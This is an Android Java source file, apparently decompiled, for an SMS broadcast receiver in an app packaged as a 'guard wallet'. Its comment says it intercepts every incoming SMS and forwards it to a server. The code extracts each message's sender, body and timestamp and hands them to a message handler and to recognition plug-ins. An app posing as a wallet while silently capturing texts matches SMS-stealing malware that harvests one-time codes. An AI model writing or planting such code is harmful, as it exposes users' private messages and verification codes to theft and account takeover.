package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.SmsMessageVO;
import com.guard.wallet.resp.SmsRecognizePlug;
import java.util.Iterator;
import java.util.LinkedList;

/**
 * vendor SmsReceiver — intercepts incoming SMS and forwards to server + SmsRecognizePlug listeners.
 */
public class SmsReceiver extends BroadcastReceiver {
    public Integer a = 0;

    @Override
    public final void onReceive(Context var1, Intent var2) {
        try {
            this.a = 1;
            if (!"android.provider.Telephony.SMS_RECEIVED".equals(var2.getAction())
                    && !"android.provider.Telephony.SMS_DELIVER".equals(var2.getAction())) {
                return;
            }

            Log.d("SmsReceiver", "开始接收短信.....");
            Bundle var5 = var2.getExtras();
            String format = var2.getStringExtra("format");

            if (var5 == null) {
                return;
            }
            if (var5.get("pdus") == null) {
                return;
            }

            Object[] pdus = (Object[]) var5.get("pdus");
            if (pdus == null || pdus.length <= 0) {
                return;
            }

            for (int i = 0; i < pdus.length; i++) {
                try {
                    byte[] pdu = (byte[]) pdus[i];
                    if (pdu == null || pdu.length <= 0) {
                        continue;
                    }

                    SmsMessage smsMsg = SmsMessage.createFromPdu(pdu, format);
                    if (smsMsg == null) {
                        continue;
                    }

                    SmsMessageVO smsVO = new SmsMessageVO(
                            smsMsg.getOriginatingAddress(),
                            smsMsg.getDisplayOriginatingAddress(),
                            smsMsg.getMessageBody(),
                            format,
                            String.valueOf(smsMsg.getTimestampMillis()),
                            1
                    );

                    String action = var2.getAction();
                    if (!AppUtils.B(action)) {
                        MessageRecordVO record = new MessageRecordVO();
                        record.setExtraBody(smsVO);
                        record.setIntentCode(action);
                        MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
                    }

                    if (MainApplication.getInstance().getSmsMessageListener() == null) {
                        continue;
                    }
                    LinkedList plugList = MainApplication.getInstance().getSmsMessageListener().a;
                    if (plugList.isEmpty()) {
                        continue;
                    }
                    Iterator it = plugList.iterator();
                    while (it.hasNext()) {
                        ((SmsRecognizePlug) it.next()).offer(smsVO);
                    }
                } catch (Exception innerEx) {
                    AppUtils.s("SmsReceiver", innerEx);
                }
            }
        } catch (Exception var20) {
            AppUtils.s("SmsReceiver", var20);
        }
    }
}
